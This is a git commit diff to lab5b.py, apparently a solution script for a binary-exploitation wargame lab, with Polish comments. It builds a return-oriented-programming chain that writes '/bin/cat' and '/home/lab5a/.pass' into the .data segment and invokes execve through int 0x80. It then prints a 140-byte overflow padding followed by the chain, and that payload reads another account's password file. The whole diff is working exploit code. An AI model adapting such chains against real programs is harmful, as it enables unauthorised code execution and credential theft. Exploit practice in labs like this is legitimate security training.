8f471a492b54a227831db1fd2a4c3016a2267cbc
Kamil Frankowicz <fumfi.255@gmail.com>
2017-04-25 19:51:52 +0200

    Update lab5b.py

--- lab5b.py
+++ lab5b.py
@@ -29,7 +29,7 @@ p += '/bin'
 p += MOV_EDX_EAX  # mov dword ptr [edx], eax ; ret
 # ------------- Wpisanie pod adres w EDX zawartosci (wskaznika) w EAX
 p += POP_EDX  # pop edx ; ret
-p += DATA_ADDR + 4  # @ .data + 4
+p += pack('<I', 0x080eb060 + 4)   # @ .data + 4
 # ------------- Sciagniecie @ .data + 4  do EDX
 p += POP_EAX  # pop eax ; ret
 p += '/cat'
@@ -37,85 +37,81 @@ p += '/cat'
 p += MOV_EDX_EAX  # mov dword ptr [edx], eax ; ret
 # ------------- Wpisanie pod adres w EDX zawartosci (wskaznika) w EA
 p += POP_EDX  # pop edx ; ret
-p += DATA_ADDR + 8 # @ .data + 8
+p += pack('<I', 0x080eb060 + 8) # @ .data + 8
 # ------------- Sciagniecie @ .data + 8  do EDX
 p += XOR_EAX_EAX  # xor eax, eax ; ret
 p += MOV_EDX_EAX  # mov dword ptr [edx], eax ; ret
 # ------------- Wpisanie pod adres w EDX zawartosci (wskaznika) w EAX - w tym wypadku nulla jako zakonczenie stringa
 
 p += POP_EDX
-p += DATA_ADDR + 9
+p += pack('<I', 0x080eb060 + 9)
 p += POP_EAX
 p += '/hom'
 p += MOV_EDX_EAX
 
 p += POP_EDX
-p += DATA_ADDR + 13
+p += pack('<I', 0x080eb060 + 13)
 p += POP_EAX
 p += 'e/la'
 p += MOV_EDX_EAX
 
 p += POP_EDX  # pop edx ; ret
-p += DATA_ADDR + 17 # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
+p += pack('<I', 0x080eb060 + 17) # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
 p += POP_EAX
 p += 'b5a/'
 p += MOV_EDX_EAX
 
 p += POP_EDX  # pop edx ; ret
-p += DATA_ADDR + 21 # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
+p += pack('<I', 0x080eb060 + 21) # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
 p += POP_EAX
 p += '.pas'
 p += MOV_EDX_EAX
 
 p += POP_EDX  # pop edx ; ret
-p += DATA_ADDR + 24 # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
+p += pack('<I', 0x080eb060 + 24) # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
 p += POP_EAX
 p += 's'
 p += MOV_EDX_EAX
 
 p += POP_EDX
-p += DATA_ADDR + 25
+p += pack('<I', 0x080eb060 + 25)
 p += POP_EAX
 p += XOR_EAX_EAX
 p += MOV_EDX_EAX
 
 p += POP_EDX
-p += DATA_ADDR + 60
+p += pack('<I', 0x080eb060 + 60)
 p += POP_EAX
 p += DATA_ADDR
 p += MOV_EDX_EAX
 
 p += POP_EDX
-p += DATA_ADDR + 64
+p += pack('<I', 0x080eb060 + 64)
 p += POP_EAX
-p += DATA_ADDR + 9
+p += pack('<I', 0x080eb060 + 9)
 p += MOV_EDX_EAX
 
 p += POP_EDX
-p += DATA_ADDR + 68
+p += pack('<I', 0x080eb060 + 68)
 p += POP_EAX
 p += XOR_EAX_EAX
 p += MOV_EDX_EAX
 
 p += POP_EBX
-p += DATA_ADDR
+p += pack('<I', 0x080eb060)
 
 p += POP_ECX
-p += DATA_ADDR + 60
+p += pack('<I', 0x080eb060 + 60)
 
 p += POP_EDX
-p += DATA_ADDR + 48
+p += pack('<I', 0x080eb060 + 48)
 
 p += XOR_EAX_EAX  # xor eax, eax ; ret
 p += EAX_ADD_3  # add eax, 3 ; ret
 p += EAX_ADD_3  # add eax, 3 ; ret
 p += EAX_ADD_3  # add eax, 3 ; ret
 p += EAX_ADD_2  # add eax, 2 ; ret
-
 p += INT  # int 0x80
 
-print len(p)
-
-# full_payload = 'A' * 140 + p
-#
-# print full_payload
+full_payload = 'A' * 140 + p
+print full_payload
